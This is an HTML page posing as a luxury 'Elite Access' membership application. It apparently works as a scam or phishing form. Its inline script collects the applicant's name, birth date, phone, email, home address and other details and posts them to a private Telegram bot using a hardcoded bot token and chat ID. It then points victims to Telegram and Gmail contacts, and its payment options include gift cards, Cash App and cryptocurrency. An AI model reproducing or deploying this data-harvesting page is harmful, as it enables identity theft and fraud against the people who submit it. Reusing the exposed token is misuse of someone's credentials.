<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Application | Elite Access</title>
  
  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
  
  <!-- Tailwind CSS via CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  
  <!-- Tailwind Configuration -->
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            cinzel: ['Cinzel', 'serif'],
            sans: ['Inter', 'sans-serif'],
          }
        }
      }
    }
  </script>
</head>
<body class="bg-[#0a0a0a] text-zinc-100 font-sans min-h-screen flex items-center justify-center p-4 md:p-8 relative overflow-x-hidden selection:bg-amber-500 selection:text-black">

  <!-- Aesthetic Ambient Background Elements -->
  <div class="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-amber-500/5 rounded-full blur-[120px] pointer-events-none"></div>
  <div class="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-yellow-600/5 rounded-full blur-[120px] pointer-events-none"></div>

  <!-- Form Container Card -->
  <div class="relative w-full max-w-2xl backdrop-blur-xl bg-white/[0.02] border border-white/[0.05] rounded-3xl p-6 md:p-12 shadow-[0_24px_60px_rgba(0,0,0,0.8)] ring-1 ring-amber-500/10 z-10 my-8">
    
    <!-- Top Decorative Line -->
    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-1/2 h-px bg-gradient-to-r from-transparent via-amber-500/40 to-transparent"></div>

    <!-- Header Section -->
    <div class="text-center mb-10">
      <h2 class="font-cinzel text-3xl md:text-4xl font-bold tracking-wide text-transparent bg-clip-text bg-gradient-to-r from-amber-200 via-yellow-400 to-amber-600 mb-3">
        Membership Application
      </h2>
      <p class="text-zinc-500 text-sm md:text-base font-light">Complete the dossier below to clear your verification process.</p>
    </div>

    <!-- Form Element -->
    <form id="membershipForm" class="space-y-6">
      
      <!-- Grid Layout for Inputs -->
      <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
        
        <!-- Full Name -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Full Name</label>
          <input type="text" id="name" placeholder="John Doe" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Date of Birth -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Date of Birth</label>
          <input type="date" id="dob" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all [color-scheme:dark]">
        </div>

        <!-- Gender -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Gender</label>
          <div class="relative">
            <select id="gender" required 
              class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white appearance-none focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
              <option value="" class="bg-zinc-950 text-zinc-500">Select Gender</option>
              <option class="bg-zinc-950">Male</option>
              <option class="bg-zinc-950">Female</option>
            </select>
          </div>
        </div>

        <!-- Phone Number -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Phone Number</label>
          <input type="tel" id="phone" placeholder="+1 (555) 000-0000" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Email Address -->
        <div class="grid grid-cols-1 md:col-span-2 flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Email Address</label>
          <input type="email" id="email" placeholder="johndoe@luxury.com" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Home Address -->
        <div class="grid grid-cols-1 md:col-span-2 flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Home Address</label>
          <input type="text" id="address" placeholder="123 Luxury Way, Beverly Hills" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Occupation -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Occupation</label>
          <input type="text" id="occupation" placeholder="Executive / Founder" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Country -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Country</label>
          <input type="text" id="country" placeholder="United States" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
        </div>

        <!-- Membership Tier -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Membership Tier</label>
          <select id="card" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white appearance-none focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
            <option value="" class="bg-zinc-950 text-zinc-500">Select Card Tier</option>
            <option class="bg-zinc-950">Gold</option>
            <option class="bg-zinc-950">Silver</option>
            <option class="bg-zinc-950">Platinum</option>
            <option class="bg-zinc-950">Diamond</option>
          </select>
        </div>

        <!-- Payment Method -->
        <div class="flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Payment Method</label>
          <select id="payment" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white appearance-none focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all">
            <option value="" class="bg-zinc-950 text-zinc-500">Select Payment</option>
            <option class="bg-zinc-950">PayPal</option>
            <option class="bg-zinc-950">Cash App</option>
            <option class="bg-zinc-950">Gift Card</option>
            <option class="bg-zinc-950">Cryptocurrency</option>
          </select>
        </div>

        <!-- Date of Application -->
        <div class="grid grid-cols-1 md:col-span-2 flex flex-col gap-1.5">
          <label class="text-xs font-semibold uppercase tracking-wider text-amber-500/80">Application Date</label>
          <input type="date" id="applicationDate" required 
            class="w-full px-4 py-3 bg-zinc-900/50 border border-zinc-800 rounded-xl text-white placeholder-zinc-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all [color-scheme:dark]">
        </div>

      </div>

      <!-- Action Button -->
      <div class="pt-4">
        <button type="button" onclick="submitForm()" 
          class="w-full py-4 bg-gradient-to-r from-amber-400 via-yellow-500 to-amber-600 hover:scale-[1.02] text-black font-semibold rounded-xl transition-all duration-300 shadow-[0_4px_20px_rgba(245,158,11,0.2)] hover:shadow-[0_4px_30px_rgba(245,158,11,0.4)] tracking-wide uppercase text-sm">
          Submit Dossier
        </button>
      </div>

      <!-- Contact Options Box (Revealed via JS) -->
      <div id="contactOptions" class="hidden border border-amber-500/20 bg-amber-500/[0.02] p-6 rounded-2xl text-center space-y-4 animate-fade-in">
        <p class="text-amber-400 font-cinzel tracking-wider text-sm">Elevate Inquiry to Executive Management:</p>
        <div class="flex justify-center items-center gap-6">
          <a href="https://t.me/Official_private03" target="_blank" class="p-3 bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 hover:border-amber-500/30 rounded-xl transition-all hover:scale-110 group">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-8 h-8" alt="Telegram">
          </a>
          <a href="mailto:Officialmanagement4296@gmail.com?subject=Membership%20Application" target="_blank" class="p-3 bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 hover:border-amber-500/30 rounded-xl transition-all hover:scale-110 group">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg" class="w-8 h-8" alt="Email">
          </a>
        </div>
      </div>

    </form>
  </div>

  <script>
    function submitForm() {
      // NOTE: Protect these tokens via backend configuration in your live setup
      const botToken = "8151429137:AAEZb095wNIkxujeKqXIzXWHycNaIOB15_0";
      const chatId = "1271362249";

      const name = document.getElementById('name').value;
      const dob = document.getElementById('dob').value;
      const gender = document.getElementById('gender').value;
      const phone = document.getElementById('phone').value;
      const email = document.getElementById('email').value;
      const address = document.getElementById('address').value;
      const occupation = document.getElementById('occupation').value;
      const country = document.getElementById('country').value;
      const card = document.getElementById('card').value;
      const payment = document.getElementById('payment').value;
      const applicationDate = document.getElementById('applicationDate').value;

      // Basic front-end check to verify fields aren't completely blank
      if(!name || !email || !phone || !card) {
        alert("Please complete the required fields.");
        return;
      }

      const message = `
🌟 New Membership Application:
• Full Name: ${name}
• Date of Birth: ${dob}
• Gender: ${gender}
• Phone Number: ${phone}
• Email: ${email}
• Home Address: ${address}
• Occupation: ${occupation}
• Country: ${country}
• Membership Card: ${card}
• Payment Method: ${payment}
• Date of Application: ${applicationDate}
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          // Unhide contact card smoothly using Tailwind removal
          const contactBox = document.getElementById('contactOptions');
          contactBox.classList.remove('hidden');
          alert("Application submitted successfully!");
        } else {
          alert("Submission failed. Please confirm connection details.");
        }
      })
      .catch(error => {
        alert("Error sending form: " + error);
      });
    }
  </script>

</body>
</html>
